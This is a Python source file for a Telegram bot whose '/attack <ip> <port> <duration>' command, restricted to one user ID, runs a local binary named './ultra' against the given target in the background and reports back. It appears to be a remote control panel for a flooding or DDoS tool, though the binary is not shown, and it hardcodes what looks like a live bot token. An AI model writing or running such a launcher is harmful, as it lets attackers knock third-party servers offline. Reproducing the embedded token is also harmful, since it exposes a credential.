import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TELEGRAM_BOT_TOKEN = "8272183377:AAFQSx5Nd1tARAw2Z6PGSDM69X3MrCam9NU"
ALLOWED_USER_ID = 6135948216


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 Bot Online!\nUse: /attack <ip> <port> <duration>"
    )


async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_exec(
            "./ultra", ip, port, duration, "800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()

        # ✅ SAFE decode (no UTF error)
        out = stdout.decode(errors="ignore") if stdout else ""
        err = stderr.decode(errors="ignore") if stderr else ""

        if out:
            print("[stdout]\n", out)

        if err:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⚠️ Error:\n{err}"
            )

        # ✅ exit status check
        if process.returncode == 0:
            await context.bot.send_message(
                chat_id=chat_id,
                text="✅ Completed successfully"
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"❌ Failed (code {process.returncode})"
            )

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ Exception: {str(e)}"
        )


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = context.args

    await update.message.reply_text(
        f"⚔️ Running...\nTarget: {ip}:{port}\nTime: {duration}s"
    )

    # background run
    asyncio.create_task(
        run_attack(update.effective_chat.id, ip, port, duration, context)
    )


def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))

    print("Bot started...")
    app.run_polling()


if __name__ == "__main__":
    main()
